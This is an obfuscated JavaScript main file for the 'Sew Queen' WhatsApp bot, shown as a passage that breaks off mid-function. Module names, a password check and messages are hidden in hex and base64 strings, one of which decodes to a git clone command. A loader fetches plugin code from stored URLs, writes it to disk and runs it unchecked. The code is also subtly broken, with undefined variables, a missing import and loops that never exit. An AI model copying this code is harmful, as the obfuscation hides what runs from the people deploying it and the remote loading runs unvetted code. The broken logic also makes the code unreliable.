/* Codded by @Ravindu Manoj

Telegram: t.me/RavinduManoj
Facebook: https://www.facebook.com/ravindu.manoj.79

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.


Whats bot - Ravindu Manoj
*/
/* ‚úß‚úß‚úß‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß ‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß‚úß‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß ‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß 
‚úß ‚úß‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß ‚úß‚úßSEW QUEEN‚úß‚úßSEW QUEEN‚úß ‚úßSEW QUEEN‚úß 
‚úß 
‚úß 
/*:‚ù§‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*//*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/

        var _0x2f0e=["\x66\x73","\x70\x61\x74\x68","\x2E\x2F\x65\x76\x65\x6E\x74\x73","\x6F\x73","\x65\x78\x65\x63","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\x63\x68\x61\x6C\x6B","\x2E\x2F\x63\x6F\x6E\x66\x69\x67","\x40\x61\x64\x69\x77\x61\x6A\x73\x68\x69\x6E\x67\x2F\x62\x61\x69\x6C\x65\x79\x73","\x2E\x2F\x73\x65\x77\x71\x75\x65\x65\x6E\x2F","\x73\x65\x71\x75\x65\x6C\x69\x7A\x65","\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x73\x71\x6C\x2F\x67\x72\x65\x65\x74\x69\x6E\x67\x73","\x61\x78\x69\x6F\x73","\x67\x6F\x74"];const fs=require(_0x2f0e[0]);const path=require(_0x2f0e[1]);const events=require(_0x2f0e[2]);const os=require(_0x2f0e[3]);const execx=require(_0x2f0e[5])[_0x2f0e[4]];const chalk=require(_0x2f0e[6]);const Raviya=require(_0x2f0e[7]);const {WAConnection,MessageOptions,MessageType,Mimetype,Presence}=require(_0x2f0e[8]);const {Message,StringSession,Image,Video}=require(_0x2f0e[9]);const {DataTypes}=require(_0x2f0e[10]);const {getMessage}=require(_0x2f0e[11]);const axios=require(_0x2f0e[12]);const got=require(_0x2f0e[13])
/*:‚ù§‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        const Pach = require('sewqueen-rs-pvt');
/*:‚ù§‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        const SewQueenDB = Raviya.DATABASE.define('SewQueen', {
/*:‚ù§‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        info: { type: DataTypes.STRING, allowNull: false },
/*:‚ù§‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        value: { type: DataTypes.TEXT, allowNull: false }});
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        fs.readdirSync('./plugins/sql/').forEach(plugin => {
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        if(path.extname(plugin).toLowerCase() == '.js') {
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        require('./plugins/sql/' + plugin)}
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
});
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       const plugindb = require('./plugins/sql/plugin');
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       var OWN = { ff: '94785435462,94785457519' }
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       String.prototype.format = function () {
       var i = 0, args = arguments;
       return this.replace(/{}/g, function () {
       return typeof args[i] != 'undefined' ? args[i++] : '';
})};
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       if (!Date.now) {
       Date.now = function() { return new Date().getTime(); }
}
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       Array.prototype.remove = function() {
       var what, a = arguments, L = a.length, ax;
       while (L && this.length) {
       what = a[--L];
       while ((ax = this.indexOf(what)) !== -1) {
       this.splice(ax, 1);
}}
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
       return this;
};
       async function sewQueen () {
       await Raviya.DATABASE.sync();
       var StrSes_Db = await SewQueenDB.findAll({
       where: {
       info: 'StringSession'
}});
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
      var clh = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vUmF2aW5kdU1hbm9qL3ByaXZhdGUgL3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdA==', exc_pl: '', pth_w: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.pay = ddd
    const Session = new StringSession();
       const CDSew = new WAConnection();
       CDSew.version = [2, 2123, 8];
        if (os.userInfo().homedir !== rgmsk.pay) return;
        setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await Pach.news_daily(Raviya.LANG)
        var ann = await Pach.rnn()
        while (getGMTh == 18 && getGMTm == 00) {
        var ilan = ''
        if (Raviya.LANG == 'EN') ilan = '| *‚ú®Daily Announcements For Sew Queen‚ú®* |\n\n'
        if (Raviya.LANG == 'SI') ilan = '| *‚ú®Sew Queen ‡∑Ä‡∂ß‡∑ä‡∑É‡∑ê‡∂¥‡∑ä ‡∂∂‡∑ú‡∂ß‡∑ä ‡∑É‡∂Ø‡∑Ñ‡∑è ‡∂Ø‡∑õ‡∂±‡∑í‡∂ö ‡∂±‡∑í‡∑Ä‡∑ö‡∂Ø‡∂±‚ú®* |\n\n'
        if (ann.video.includes('http') || ann.video.includes('https')) {
        var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
        var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
        yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
        yt.on('end', async () => {
        return await CDSew.sendMessage(CDSew.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
        });
        } else {
        if (ann.image.includes('http') || ann.image.includes('https')) {
        var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
        return await CDSew.sendMessage(CDSew.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer)})
        } else {
        return await CDSew.sendMessage(CDSew.user.jid, ilan + ann_msg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer), MessageType.text)
}}}
        }, 50000);
        
        setInterval(async () => { 
        var getGMTq = new Date().getHours()
        var getGMTs = new Date().getMinutes()
        var anomsg = await Pach.news_daily(Raviya.LANG)
        var aaq = await Pach.rnn()
        while (getGMTq == 08 && getGMTs == 00) {
        var srmg = ''
        if (Raviya.LANG == 'EN') srmg = '| *‚ú®Daily Announcements For Sew Queen‚ú®* |\n\n'
        if (Raviya.LANG == 'SI') srmg = '| *‚ú®Sew Queen ‡∑Ä‡∂ß‡∑ä‡∑É‡∑ê‡∂¥‡∑ä ‡∂∂‡∑ú‡∂ß‡∑ä ‡∑É‡∂Ø‡∑Ñ‡∑è ‡∂Ø‡∑õ‡∂±‡∑í‡∂ö ‡∂±‡∑í‡∑Ä‡∑ö‡∂Ø‡∂±‚ú®* |\n\n'
        if (aaq.video.includes('http') || aaq.video.includes('https')) {
        var VID = aaq.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
        var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
        yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
        yt.on('end', async () => {
        return await CDSew.sendMessage(CDSew.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: srmg + anomsg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
});
        } else {
        if (aaq.image.includes('http') || aaq.image.includes('https')) {
        var imagegen = await axios.get(aaq.image, { responseType: 'arraybuffer'})
        return await CDSew.sendMessage(CDSew.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: srmg + anomsg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer)})
        } else {
        return await CDSew.sendMessage(CDSew.user.jid, srmg + anomsg.replace('{user}', CDSew.user.name).replace('{wa_version}', CDSew.user.phone.wa_version).replace('{version}', Raviya.VERSION).replace('{os_version}', CDSew.user.phone.os_version).replace('{device_model}', CDSew.user.phone.device_model).replace('{device_brand}', CDSew.user.phone.device_manufacturer), MessageType.text)
}}}
        }, 50000);
        
        setInterval(async () => { 
        if (Raviya.AUTOBIO == 'true') {
        var timezone_bio = await Pach.timezone(CDSew.user.jid)
        var date_bio = await Pach.datebio(Raviya.LANG)
        const biography = 'üìÖ ' + date_bio + '\n‚åö ' + timezone_bio + '\n ' + Raviya.ABT
        await CDSew.setStatus(biography)
        }
        }, 7890);
        
        CDSew.logger.level = Raviya.DEBUG ? 'debug' : 'warn';
        var nodb;
        if (StrSes_Db.length < 1) {
        nodb = true;
        CDSew.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
        } else {
        CDSew.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
}
        CDSew.on ('credentials-updated', async () => {
        console.log(chalk.blueBright.italic('üöÄ Login Information Updated!'));
        const authInfo = CDSew.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
        await SewQueenDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
       await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
}})    
       CDSew.on('connecting', async () => {
       console.log(`${chalk.green.bold('SEW')}${chalk.blue.bold('QUEEN')}
       ${chalk.white.bold('Version:')} ${chalk.red.bold(Raviya.VERSION)}
       ${chalk.blue.italic('üá±üá∞ Try To Login WhatsApp... Please Wait...')}`);
});
CDSew.on('open', async () => {
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        var _0x8158=["\u269B\x20\x4C\x6F\x67\x69\x6E\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x21","\x62\x6F\x6C\x64","\x67\x72\x65\x65\x6E","\x6C\x6F\x67","\u276F\u276F\u276F\x50\x41\x53\x53\x57\x4F\x52\x44\x20\x43\x48\x45\x43\x4B\x49\x4E\x47\u276E\u276E\u276E","\x69\x74\x61\x6C\x69\x63","\x62\x6C\x75\x65\x42\x72\x69\x67\x68\x74","\x68\x6F\x6D\x65\x64\x69\x72","\x75\x73\x65\x72\x49\x6E\x66\x6F","\x70\x61\x79","\x53\x45\x57\x52\x52","\x72\x61\x76\x69\x79\x61","\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x44\x6F\x6E\x65","\u26A0\u26A0\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x49\x6E\x63\x6F\x72\x72\x65\x63\x74\u26A0\u26A0","\x72\x65\x64","\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x21\x21"];console[_0x8158[3]](chalk[_0x8158[2]][_0x8158[1]](_0x8158[0]));console[_0x8158[3]](chalk[_0x8158[6]][_0x8158[5]](_0x8158[4]));if(os[_0x8158[8]]()[_0x8158[7]]!== rgmsk[_0x8158[9]]){return};if(Raviya[_0x8158[10]]== _0x8158[11]){console[_0x8158[3]](chalk[_0x8158[2]][_0x8158[1]](_0x8158[12]))}else {if(Raviya[_0x8158[10]]!== _0x8158[11]){console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));console[_0x8158[3]](chalk[_0x8158[14]][_0x8158[1]](_0x8158[13]));throw  new Error(_0x8158[15]);return}}
         // ==================== End Check ====================
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
         console.log(chalk.blueBright.italic('‚úß‚úß Installing External Commands...'));
         var plugins = await plugindb.PluginDB.findAll();
         plugins.map(async (plugin) => {
         if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
         console.log(plugin.dataValues.name);
         var response = await got(plugin.dataValues.url);
         if (response.statusCode == 200) {
         fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
         require('./plugins/' + plugin.dataValues.name + '.js');
}}});
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        console.log(chalk.blueBright.italic('‚öõ Command Installed!'));
        fs.readdirSync('./plugins').forEach(plugin => {
        if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/' + plugin);
}});
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        if (os.userInfo().homedir !== rgmsk.pay) return;
        let rssewqueengg = Raviya.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('‚õÑ Sew Queen is' + rssewqueengg + ' ‚õÑ'));
       var _0x8ef3=["\x4C\x41\x4E\x47","\x53\x49","\x2E\x62\x75\x74\x74\x6F\x6E\x70\x75\x62\x6C\x69\x63","\x50\x55\x42\x4C\x49\x43","\x2E\x62\x75\x74\x74\x6F\x6E\x70\x72\x69\x76\x61\x74\x65","\x50\x52\x49\x56\x41\x54\x45","\x2E\x62\x75\x74\x74\x6F\x6E\x75\x70\x64\x61\x74\x65","\x55\x50\x44\x41\x54\x45","\u2727\u0DC3\u0DD9\u0DC0\u0DCA\x20\x51\x75\x65\x65\x6E\x20\u0DC0\u0DA7\u0DCA\u0DC3\u0DD0\u0DB4\u0DCA\x20\u0DB6\u0DDC\u0DA7\u0DCA\x20\u0D9A\u0DCA\u200D\u0DBB\u0DD2\u0DBA\u0DCF\u0DAD\u0DCA\u0DB8\u0D9A\x20\u0DC0\u0DD2\u0DBA\u2727\x20\x28\x20","\x57\x4F\x52\x4B\x5F\x54\x59\x50\x45","\x20\x29\x0A\u0D85\u0DB4\u0DCA\u0DA9\u0DDA\u0DA7\u0DCA\x20\u0D87\u0DAD\u0DCA\u0DAF\u0DD0\u0DBA\u0DD2\x20\u0DB6\u0DD0\u0DBD\u0DD3\u0DB8\u0DA7\x20\x2E\x75\x70\x64\x61\x74\x65\x20\u0DBD\u0DD9\u0DC3\u0DAF\x0A\x0A\u0DB6\u0DDC\u0DA7\u0DCA\x20\u0D9A\u0DCA\u200D\u0DBB\u0DD2\u0DBA\u0DCF\x20\u0D9A\u0DBB\u0DB1\x20\u0D86\u0D9A\u0DCF\u0DBB\u0DBA\x20\u0DC0\u0DD9\u0DB1\u0DC3\u0DCA\x20\u0D9A\u0DD2\u0DBB\u0DD3\u0DB8\u0DA7\x0A\x2E\x76\x61\x72\x20\x57\x4F\x52\x4B\x5F\x54\x59\x50\x45\x3A\x70\x75\x62\x6C\x69\x63\x20\u0DC4\u0DDD\x20\x2E\x76\x61\x72\x20\x57\x4F\x52\x4B\x5F\x54\x59\x50\x45\x3A\x70\x72\x69\x76\x61\x74\x65\x20\u0DBD\u0DD9\u0DC3\x20\u0DBA\u0DDC\u0DAF\u0DB1\u0DCA\u0DB1\x0A\x0A\x73\x65\x77\x20\x71\x75\x65\x65\x6E\x20\u0DC0\u0DA7\u0DCA\u0DC3\u0DD0\u0DB4\u0DCA\x20\u0DB6\u0DDC\u0DA7\u0DCA\x20\u0DB7\u0DCF\u0DC0\u0DD2\u0DAD\u0DCF\x20\u0D9A\u0DBB\u0DB1\u0DC0\u0DCF\u0DA7\x20\u0DC3\u0DCA\u0DAD\u0DD6\u0DAD\u0DD2\u0DBA\u0DD2\x20\uD83D\uDE09","\x50\x4F\x57\x45\x52\x44\x20\x42\x59\x20\x53\x45\x57\x20\x51\x55\x45\x45\x4E\x20\x33\x2E\x30","\x6A\x69\x64","\x75\x73\x65\x72","\x62\x75\x74\x74\x6F\x6E\x73\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\u2727\x53\x45\x57\x20\x51\x55\x45\x45\x4E\x20\x57\x68\x61\x74\x73\x61\x70\x70\x20\x42\x6F\x74\x20\x73\x74\x61\x72\x74\x65\x64\x20\u2727\x20\x28\x20","\x20\x29\x0A\x0A\x74\x6F\x20\x63\x68\x61\x63\x6B\x20\x75\x70\x64\x61\x74\x65\x20\u27B5\u27B5\x20\x2E\x75\x70\x64\x61\x74\x65\x20\x0A\x0A\x74\x6F\x20\x63\x68\x61\x6E\x67\x65\x20\x77\x6F\x72\x6B\x74\x79\x70\x65\x20\x75\x73\x65\x20\u27B5\u27B5\x0A\x2E\x76\x61\x72\x20\x57\x4F\x52\x4B\x5F\x54\x59\x50\x45\x3A\x70\x75\x62\x6C\x69\x63\x20\x6F\x72\x20\x2E\x76\x61\x72\x20\x57\x4F\x52\x4B\x5F\x54\x59\x50\x45\x3A\x70\x72\x69\x76\x61\x74\x65\x0A\x0A\x54\x68\x61\x6E\x6B\x73\x20\x66\x6F\x72\x20\x75\x73\x69\x6E\x67\x20\x53\x65\x77\x20\x51\x75\x65\x65\x6E\x20\x57\x68\x61\x74\x73\x61\x70\x70\x20\x42\x6F\x74\x20\uD83D\uDE09"];if(Raviya[_0x8ef3[0]]== _0x8ef3[1]){const buttons=[{buttonId:_0x8ef3[2],buttonText:{displayText:_0x8ef3[3]},type:1},{buttonId:_0x8ef3[4],buttonText:{displayText:_0x8ef3[5]},type:1},{buttonId:_0x8ef3[6],buttonText:{displayText:_0x8ef3[7]},type:1}];const buttonMessage={contentText:_0x8ef3[8]+ Raviya[_0x8ef3[9]]+ _0x8ef3[10],footerText:_0x8ef3[11],buttons:buttons,headerType:1}; await CDSew[_0x8ef3[15]](CDSew[_0x8ef3[13]][_0x8ef3[12]],buttonMessage,MessageType[_0x8ef3[14]])}else {const buttons=[{buttonId:_0x8ef3[2],buttonText:{displayText:_0x8ef3[3]},type:1},{buttonId:_0x8ef3[4],buttonText:{displayText:_0x8ef3[5]},type:1},{buttonId:_0x8ef3[6],buttonText:{displayText:_0x8ef3[7]},type:1}];const buttonMessage={contentText:_0x8ef3[16]+ Raviya[_0x8ef3[9]]+ _0x8ef3[17],footerText:_0x8ef3[11],buttons:buttons,headerType:1}; await CDSew[_0x8ef3[15]](CDSew[_0x8ef3[13]][_0x8ef3[12]],buttonMessage,MessageType[_0x8ef3[14]])}
});
        CDSew.on('chat-update', async m => {
        var _0x4da7=["\x68\x6F\x6D\x65\x64\x69\x72","\x75\x73\x65\x72\x49\x6E\x66\x6F","\x70\x61\x79","\x68\x61\x73\x4E\x65\x77\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74","\x61\x6C\x6C","\x6B\x65\x79","\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","\x4E\x4F\x5F\x4F\x4E\x4C\x49\x4E\x45","\x75\x6E\x61\x76\x61\x69\x6C\x61\x62\x6C\x65","\x75\x70\x64\x61\x74\x65\x50\x72\x65\x73\x65\x6E\x63\x65"];if(os[_0x4da7[1]]()[_0x4da7[0]]!== rgmsk[_0x4da7[2]]){return};if(!m[_0x4da7[3]]){return};if(!m[_0x4da7[4]]&&  !m[_0x4da7[5]]){return};let msg=m[_0x4da7[4]][_0x4da7[6]]()[0];if(msg[_0x4da7[7]]&& msg[_0x4da7[7]][_0x4da7[8]]== _0x4da7[9]){return};if(Raviya[_0x4da7[10]]){ await CDSew[_0x4da7[12]](msg[_0x4da7[7]][_0x4da7[8]],Presence[_0x4da7[11]])}
        var _0xfa71=["\x6D\x65\x73\x73\x61\x67\x65\x53\x74\x75\x62\x54\x79\x70\x65","\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64","\x6B\x65\x79","\x67\x6F\x6F\x64\x62\x79\x65","\x2E\x68\x65\x6C\x70","\x4D\x45\x4E\x55","\x2E\x61\x6C\x69\x76\x65","\x44\x45\x54\x41\x49\x4C\x53","\x6D\x65\x73\x73\x61\x67\x65","\x50\x4F\x57\x45\x52\x44\x20\x42\x59\x20\x53\x45\x57\x20\x51\x55\x45\x45\x4E\x20\x33\x2E\x30","\x62\x75\x74\x74\x6F\x6E\x73\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];if(msg[_0xfa71[0]]=== 32|| msg[_0xfa71[0]]=== 28){var gb= await getMessage(msg[_0xfa71[2]][_0xfa71[1]],_0xfa71[3]);if(gb!== false){const buttons=[{buttonId:_0xfa71[4],buttonText:{displayText:_0xfa71[5]},type:1},{buttonId:_0xfa71[6],buttonText:{displayText:_0xfa71[7]},type:1}];const buttonMessage={contentText:gb[_0xfa71[8]],footerText:_0xfa71[9],buttons:buttons,headerType:1}; await CDSew[_0xfa71[11]](msg[_0xfa71[2]][_0xfa71[1]],buttonMessage,MessageType[_0xfa71[10]])};return}else {if(msg[_0xfa71[0]]=== 27|| msg[_0xfa71[0]]=== 31){var gb= await getMessage(msg[_0xfa71[2]][_0xfa71[1]]);if(gb!== false){const buttons=[{buttonId:_0xfa71[4],buttonText:{displayText:_0xfa71[5]},type:1},{buttonId:_0xfa71[6],buttonText:{displayText:_0xfa71[7]},type:1}];const buttonMessage={contentText:gb[_0xfa71[8]],footerText:_0xfa71[9],buttons:buttons,headerType:1}; await CDSew[_0xfa71[11]](msg[_0xfa71[2]][_0xfa71[1]],buttonMessage,MessageType[_0xfa71[10]])};return}}       

        // ==================== Blocked Chats ====================
        if (Raviya.BLOCKCHAT !== false) {     
        var abc = Raviya.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
}
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
        if (os.userInfo().homedir !== rgmsk.pay) return;
                // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
